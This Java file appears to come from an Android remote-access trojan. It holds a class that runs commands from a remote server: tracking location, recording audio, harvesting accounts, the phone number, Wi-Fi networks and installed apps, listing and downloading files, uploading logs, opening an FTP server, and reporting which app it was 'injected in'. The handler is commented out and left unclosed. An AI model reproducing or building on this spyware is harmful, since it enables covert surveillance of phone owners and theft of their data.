package com.safe.myapp;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.ResolveInfo;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
import android.util.StringBuilderPrinter;
import android.widget.Toast;

import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.List;

/**
 * Created by stofstik on 4-2-15.
 */
public class SafeCommands {

    private Context context;
    private SafeAudio audio;
    private SafeCommunications comms;
    private SafeLogger logger;
    private SafeLocations locs;
    private SafeFTPServer ftpServer;
    private String simpleId;

    // TODO make key value pair
    private static final String[] COMMANDS = {
            "respond", "location start", "location stop", "location single",
            "audio start", "audio stop", "toast ", "dialog ", "wifi",
            "accounts", "phone number", "ls ", "download ", "commands",
            "version", "infected", "address", "timeout ", "status", "getlog",
            "ftp start", "ftp stop", "apps"};


    public SafeCommands(Context context, SafeCommunications comms, SafeLogger logger,
                        SafeLocations locs, SafeAudio audio, SafeFTPServer ftpServer, String simpleId) {
        this.context = context;
        this.comms = comms;
        this.logger = logger;
        this.locs = locs;
        this.audio = audio;
        this.ftpServer = ftpServer;
        this.simpleId = simpleId;
    }

    /*// handle messages
    public void messageHandler(String fromServer) {
        logger.write(fromServer);
        if (fromServer.equalsIgnoreCase(COMMANDS[0])) {
            comms.say("Responding");
        } else if (fromServer.equalsIgnoreCase(COMMANDS[1])) {
            locs.startLocations();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[2])) {
            locs.stopLocations();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[3])) {
            locs.getSingleLocation();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[4])) {
            audio.startRecording();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[5])) {
            audio.stopRecording();
        } else if (fromServer.startsWith(COMMANDS[6])) {
            toast(fromServer);
        } else if (fromServer.startsWith(COMMANDS[7])) {
            dialog(fromServer);
        } else if (fromServer.startsWith(COMMANDS[8])) {
            getWiFiNetworks();
        } else if (fromServer.startsWith(COMMANDS[9])) {
            getAccounts();
        } else if (fromServer.startsWith(COMMANDS[10])) {
            getPhoneNumber();
        } else if (fromServer.startsWith(COMMANDS[11])) {
            listDir(fromServer.substring(COMMANDS[11].length(), fromServer.length()));
        } else if (fromServer.startsWith(COMMANDS[12])) {
            String[] args = fromServer.substring(COMMANDS[12].length(), fromServer.length()).split(" ");
            comms.download(args);
        } else if (fromServer.startsWith(COMMANDS[13])) {
            for (String command : COMMANDS) {
                logger.write(command);
            }
        } else if (fromServer.startsWith(COMMANDS[14])) {
            comms.say("Version: " + SafeService.VERSION);
        } else if (fromServer.startsWith(COMMANDS[15])) {
            comms.say("Injected in: " + context.getApplicationContext().getPackageName());
        } else if (fromServer.startsWith(COMMANDS[16])) {
            comms.say(locs.getLastKnownAddress());
        } else if (fromServer.startsWith(COMMANDS[17])) {
            SafeService.setSoTimeOut(fromServer.substring(COMMANDS[17].length(), fromServer.length()));
        } else if (fromServer.equalsIgnoreCase(COMMANDS[18])) {
            sayStatus();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[19])) {
            comms.upload(logger.logfile());
        } else if (fromServer.startsWith(COMMANDS[20])) {
            try {
                String stringPort = fromServer.substring(COMMANDS[20].length() + 1, fromServer.length());
                try {
                    int port = Integer.parseInt(stringPort);
                    ftpServer.startServer(port);
                } catch (NumberFormatException e) {
                    comms.say("Not a valid port: \'" + stringPort + "\'");
                }
            } catch (StringIndexOutOfBoundsException e) {
                comms.say("Not a valid command, need \"ftp start port_num\"");
            }
        } else if (fromServer.equalsIgnoreCase(COMMANDS[21])) {
            ftpServer.stopServer();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[22])) {
            installedApps();
        }



    private void getScreenShot(){

    }



    */

}
